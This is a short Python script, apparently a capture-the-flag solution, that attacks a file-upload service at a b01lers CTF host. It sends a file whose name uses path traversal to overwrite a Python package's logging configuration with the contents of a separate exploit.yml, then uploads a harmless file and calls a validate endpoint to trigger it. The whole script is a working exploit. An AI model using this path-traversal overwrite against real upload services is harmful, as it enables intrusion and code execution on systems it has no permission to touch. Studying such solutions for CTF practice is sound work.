import time

import requests

URL = "https://yaml-practice-b5dcccd4008b3771.b01lersc.tf"
FILENAME = "test.yml"
exploit_file = {
    "file": (
        "../.venv/lib/python3.14/site-packages/prefect/logging/logging.yml",
        open("exploit.yml", "r").read(),
        "text/yaml",
    )
}

normal_file = {
    "file": (
        FILENAME,
        "a: a",
        "text/yaml",
    )
}

requests.post(f"{URL}/upload", files=exploit_file, verify=False)
time.sleep(20)
requests.post(f"{URL}/upload", files=normal_file, verify=False)
time.sleep(20)
requests.post(f"{URL}/validate", json={"filename": FILENAME}, verify=False)
